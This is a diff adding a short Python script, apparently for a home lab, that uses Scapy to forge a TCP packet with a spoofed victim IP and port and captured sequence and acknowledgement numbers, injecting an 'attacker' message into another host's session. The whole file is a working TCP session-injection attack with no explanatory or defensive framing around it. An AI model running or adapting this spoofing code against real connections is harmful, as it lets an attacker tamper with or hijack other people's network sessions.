@@ -1,0 +1,16 @@
+from scapy.all import *
+
+src_ip = "192.168.1.10"     # Victim IP
+dst_ip = "192.168.1.20"     # Server IP
+src_port = 50500            # Victim source port (check in Wireshark)
+dst_port = 9999             # Server port (netcat)
+
+seq = 123456789             # Captured sequence number
+ack = 987654321             # Captured ACK number
+payload = "Injected message from attacker\n"
+
+ip = IP(src=src_ip, dst=dst_ip)
+tcp = TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq, ack=ack)
+pkt = ip/tcp/payload
+
+send(pkt)
